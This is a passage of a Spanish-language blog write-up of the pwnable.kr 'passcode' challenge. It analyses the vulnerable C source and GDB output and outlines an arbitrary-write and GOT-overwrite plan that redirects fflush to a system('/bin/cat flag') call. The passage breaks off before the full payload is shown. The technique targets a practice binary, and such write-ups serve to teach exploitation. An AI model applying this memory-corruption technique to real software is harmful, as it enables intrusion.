@@ -1,0 +1,1338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>pwnable.kr passcode - Arbitrary write y sobrescritura de GOT | c4rta</title>
+<meta name="generator" content="Jekyll v4.3.2">
+<meta property="og:title" content="pwnable.kr passcode - Arbitrary write y sobrescritura de GOT">
+<meta name="author" content="c4rta">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Tenemos un GOT overwrite donde a través de la escritura arbitraria, podemos sobreescribir la entrada .GOT de fflush() por la dirección de system(bin/cat flag) y leer la flag">
+<meta property="og:description" content="Tenemos un GOT overwrite donde a través de la escritura arbitraria, podemos sobreescribir la entrada .GOT de fflush() por la dirección de system(bin/cat flag) y leer la flag">
+<link rel="canonical" href="https://ic4rta.github.io//explotacion%20binaria/2023/01/18/pwnable.kr-passcode.html">
+<meta property="og:url" content="https://ic4rta.github.io//explotacion%20binaria/2023/01/18/pwnable.kr-passcode.html">
+<meta property="og:site_name" content="c4rta">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2023-01-18T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta property="twitter:title" content="pwnable.kr passcode - Arbitrary write y sobrescritura de GOT">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"c4rta"},"dateModified":"2023-01-18T00:00:00+00:00","datePublished":"2023-01-18T00:00:00+00:00","description":"Tenemos un GOT overwrite donde a través de la escritura arbitraria, podemos sobreescribir la entrada .GOT de fflush() por la dirección de system(bin/cat flag) y leer la flag","headline":"pwnable.kr passcode - Arbitrary write y sobrescritura de GOT","mainEntityOfPage":{"@type":"WebPage","@id":"https://ic4rta.github.io//explotacion%20binaria/2023/01/18/pwnable.kr-passcode.html"},"url":"https://ic4rta.github.io//explotacion%20binaria/2023/01/18/pwnable.kr-passcode.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="/favicon.png">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script>
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+<link type="application/atom+xml" rel="alternate" href="https://ic4rta.github.io//feed.xml" title="c4rta">
+<script>
+  function initGoogleAnalytics() {
+    var doNotTrack = (window.doNotTrack === "1" || navigator.doNotTrack === "1" ||
+      navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1");
+    var enableDNT = "true" == "true";
+
+    if (!enableDNT || !doNotTrack) {
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-212989441-1', 'auto');
+      ga('send', 'pageview');
+    }
+  }
+  window.addEventListener("load", initGoogleAnalytics);
+</script>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/languages/go.min.js"></script>
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #fff -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #ff4e00 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+
+</head>
+<body>
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+<header class="site-header site-header-transparent" role="banner">
+
+  <div class="wrapper">    
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="c4rta" src="/favicon.png" onerror="this.style.display='none'">
+  c4rta
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>      
+          <div class="trigger">
+<a class="page-link" href="/">Home</a><a class="page-link" href="/categories.html">Categorias</a><a class="page-link" href="/tags.html">Etiquetas</a><a class="page-link" href="/about.html">Sobre Mi</a><a class="page-link" href="https://github.com/ic4rta" target="_blank"><img src="https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white" alt="GitHub"></a>
+            <a class="page-link" href="http://twitter.com/_c4rta_" target="_blank"><img src="https://img.shields.io/badge/Twitter%20-%230077B5.svg?&style=for-the-badge&logo=Twitter&logoColor=white%22" alt="Twitter"></a>
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+</div>
+        </nav>
+</div>
+  </div>
+
+</header>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+<script>
+  function initHeader() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;documentElement.setAttribute("data-header-transparent", "");var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  }
+  document.addEventListener('DOMContentLoaded', initHeader);
+</script>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+<style>
+    html .page-banner {
+      background: #000;
+    }
+  </style>
+<style>html .page-banner {
+      height:  18.4vh;
+      min-height: 50vh;
+    }
+    html[data-scroll-status="top"] .page-banner {
+      height: 50vh;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-img > *:first-child {
+      opacity: 0.618;
+    }
+
+    html[data-theme="dark"] .page-banner .page-banner-img > *:first-child {
+      opacity: 0.443724;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(1) {
+      font-size: 2.25em; font-weight: bold; 
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(2) {
+      color: gold
+    }
+  </style>
+<section class="page-banner">
+    <div class="page-banner-img">
+<div style="background-image: url(/assets/images/home/home-t.png)"></div>
+        <img class="img-placeholder" src="/assets/images/home/home-t.png">
+</div>
+    <div class="wrapper">
+      <div class="page-banner-inner">
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">pwnable.kr passcode - Arbitrary write y sobrescritura de GOT</h1>
+  <h2 class="post-subtitle"></h2>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2023-01-18T00:00:00+00:00" itemprop="datePublished"><i class="fa fa-calendar"></i> Jan 18, 2023
+    </time>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_article_words] 1405 -->
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 8 mins</span>
+  </p>
+<div class="post-tags">
+<a class="post-tag" href="/tags.html#GOT%20overwrite">#GOT overwrite</a><a class="post-tag" href="/tags.html#Arbitrary%20Write">#Arbitrary Write</a>
+</div></header>
+</div>
+    </div>
+  </section><script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    hashValue = decodeURIComponent(hashValue);
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+  
+      <!-- [function][get_value] auto -->
+  
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <p class="lead">Tenemos un GOT overwrite donde a través de la escritura arbitraria, podemos sobreescribir la entrada .GOT de fflush() por la dirección de system(bin/cat flag) y leer la flag</p>
+
+<h2 id="analisis-del-binario">Analisis del binario</h2>
+
+<h3 id="funcion-main">Funcion main</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Toddler's Secure Login System 1.0 beta.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+	<span class="n">welcome</span><span class="p">();</span>
+	<span class="n">login</span><span class="p">();</span>
+
+	<span class="c1">// something after login...</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Now I can safely trust you that you have credential :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>	
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Lo unico que hace es llamar a dos funciones: <code class="language-plaintext highlighter-rouge">welcome</code> y <code class="language-plaintext highlighter-rouge">login</code> e imprimer unos cuantos mensajes</p>
+
+<h3 id="funcion-welcome">Funcion welcome</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">welcome</span><span class="p">(){</span>
+	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"enter you name : "</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">"%100s"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Welcome %s!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Vemos que se declara un buffer de 100, basicamente esta funcion toma 100 caracteres los cuales los guarda en la variable <code class="language-plaintext highlighter-rouge">name</code> e imprime el mensaje <code class="language-plaintext highlighter-rouge">Welcome</code> y lo que tenga <code class="language-plaintext highlighter-rouge">name</code></p>
+
+<h3 id="funcion-login">Funcion login</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">login</span><span class="p">(){</span>
+	<span class="kt">int</span> <span class="n">passcode1</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">passcode2</span><span class="p">;</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"enter passcode1 : "</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">passcode1</span><span class="p">);</span>
+	<span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+
+	<span class="c1">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"enter passcode2 : "</span><span class="p">);</span>
+        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">passcode2</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"checking...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">passcode1</span><span class="o">==</span><span class="mi">338150</span> <span class="o">&amp;&amp;</span> <span class="n">passcode2</span><span class="o">==</span><span class="mi">13371337</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"Login OK!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat flag"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"Login Failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Después de eso tenemos la funcion <code class="language-plaintext highlighter-rouge">login()</code> que lee dos números enteros, luego los compara con dos constantes y, si coinciden obtenemos la bandera</p>
+
+<p>Todo parece muy simple, pero si intentamos correrlo pasandole esos valores con los que se compara, veremos algo como esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passcode@pwnable:~$ ./passcode 
+Toddler's Secure Login System 1.0 beta.
+enter you name : c4rta
+Welcome c4rta!
+enter passcode1 : 338150
+Segmentation fault (core dumped)
+</code></pre></div></div>
+<p>Peto, pero como es que peto si parece que espera un tipo de dato int y encima el que le pasamos es igual a <code class="language-plaintext highlighter-rouge">338150</code> que es el primer valor con el que se compara.</p>
+
+<p>Aqui una recomendacion es que si tiene el codigo fuente, lo vuelvan a compilar para ver si tiene algunos warnings y en este caso nos muestra eso:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passcode.c: In function ‘login’:
+passcode.c:9:8: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
+    scanf("%d", passcode1);
+    ^
+</code></pre></div></div>
+
+<p>Con esto nos podemos dar cuenta el input que se guarda en <code class="language-plaintext highlighter-rouge">passcode1</code> no se interpreta como un int, si no como una direccion, de hecho ahi nos dice que espera un <code class="language-plaintext highlighter-rouge">int *</code>, esto deriva de un <code class="language-plaintext highlighter-rouge">arbitrary write</code>, en la cual es la variable <code class="language-plaintext highlighter-rouge">passcode1</code> podemos poner lo que queramos</p>
+
+<h3 id="depurandolo-con-gdb">Depurandolo con GDB</h3>
+
+<p>Aqui me ire directamente a la funcion <code class="language-plaintext highlighter-rouge">login()</code> para que puedan ver que las variables se tratan como direcciones (les recomiendo que lo pongan con sintaxis intel, la sintaxis at&amp;t esta medio pedorra: <code class="language-plaintext highlighter-rouge">set disassembly-flavor intel</code>)</p>
+
+<p>Quiero destacar algo, generalmente en ensamblador para acceder a las varibles de una funcion se hace uso del <code class="language-plaintext highlighter-rouge">EBP</code>, esto lo digo ya que podemos tener una idea de donde se encuentran nuestras variables, quiero resaltar esto:</p>
+
+<p><img src="/assets/img/passcode/1.png" alt=""></p>
+
+<p>Puede ser que lo que esta en <code class="language-plaintext highlighter-rouge">ebp-0x10</code> sea la variable passcode asi que para corroborar eso pondre un breakpoint alli e ejecutare el programa:</p>
+
+<p>Como se puede ver:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/xw $ebp-0x10
+0xffefef58:	0xf7586cbb
+</code></pre></div></div>
+<p>La variable <code class="language-plaintext highlighter-rouge">passcode1</code> (ebp-0x10) esta apuntando a <code class="language-plaintext highlighter-rouge">0xf7586cbb</code>, que es la direccion en la que esta escribiendo en <code class="language-plaintext highlighter-rouge">scanf()</code></p>
+
+<p>Ademas podemos ver que en las comparaciones:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmp    DWORD PTR [ebp-0x10],0x528e6
+DWORD PTR [ebp-0xc],0xcc07c9
+</code></pre></div></div>
+
+<p>Esta comparando direcciones <code class="language-plaintext highlighter-rouge">0x528e6</code> y <code class="language-plaintext highlighter-rouge">0xcc07c9</code> no un valor, entonces el código intenta cargar la dirección de <code class="language-plaintext highlighter-rouge">passcode1</code> y <code class="language-plaintext highlighter-rouge">passcode2</code> que obviamente no existen. Esa es la razon por la que el programa peta</p>
+
+<h2 id="explotacion">Explotacion</h2>
+
+<p>Si sabemos que tenenemos una escritura arbitraria para poder sobrescribir el valor de passcode1, ¿Entonces como nos aprovechamos de esto?, pues debemos de aplicar otra tecnica llamada GOT overwrite</p>
+
+<p>En el código de login() después de scanf lo que sigue después es fflush(stdin), esto puede ser usado para realizar un “salto” hacía una dirección. Si te das cuenta, cuando vemos el código te la función fflush(), está usando la instrucción jmp para saltar a <code class="language-plaintext highlighter-rouge">0x804a004</code> , además fflush está referenciada por .PLT y eso lo podemos ver en <code class="language-plaintext highlighter-rouge">fflush@PLT</code> así que fflush() debe de tener una entrada en .GOT a la que va a saltar, ademas, gracias a qué scanf() está antes que fflush(), nosotros podemos controlar <code class="language-plaintext highlighter-rouge">0x804a004</code>, la idea es:</p>
+
+<ul>
+  <li>
+    <p>Mandar los suficientes bytes para llenar el buffer</p>
+  </li>
+  <li>
+    <p>Sobreescribir passcode1 por 0x804a004, y eso nos permitirá una escritura arbitraria en fflush@GOT</p>
+  </li>
+  <li>
+    <p>Y a través de la escritura arbitraria, podemos sobreescribir la entrada .GOT de fflush() por la dirección de system(bin/cat flag)</p>
+  </li>
+</ul>
+
+<h3 id="desplazamiento-para-passcode1">Desplazamiento para passcode1</h3>
+
+<p>Lo primero que hay que obtener es el desplazamiento para llegar a <code class="language-plaintext highlighter-rouge">passcode1</code>, y es bien facil, simplemente podemos hacer una resta de la ubicacion de la variable <code class="language-plaintext highlighter-rouge">name</code> la que recibe nuestro primer input, con la ubicacion de la variable <code class="language-plaintext highlighter-rouge">passcode</code> y la variable <code class="language-plaintext highlighter-rouge">name</code> esta <code class="language-plaintext highlighter-rouge">0x70</code> por debajo de <code class="language-plaintext highlighter-rouge">EBP</code>, deja te muesto.</p>
+
+<p>En la funcion <code class="language-plaintext highlighter-rouge">welcome()</code> hay una linea como esta:</p>
+
+<p><code class="language-plaintext highlighter-rouge">0x0804862f &lt;+38&gt;:	lea    edx,[ebp-0x70]</code></p>
+
+<p>La cual usa el registro <code class="language-plaintext highlighter-rouge">EDX</code> este registro es usado para menejar las operaciones I/0, asi que pondre un breakpoint donde se recibe nuestro input</p>
+
+<p><code class="language-plaintext highlighter-rouge">b *0x08048643</code></p>
+
+<p>Ahora si yo muestro lo que tiene <code class="language-plaintext highlighter-rouge">ebp-0x70</code> veremos algo como esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) r
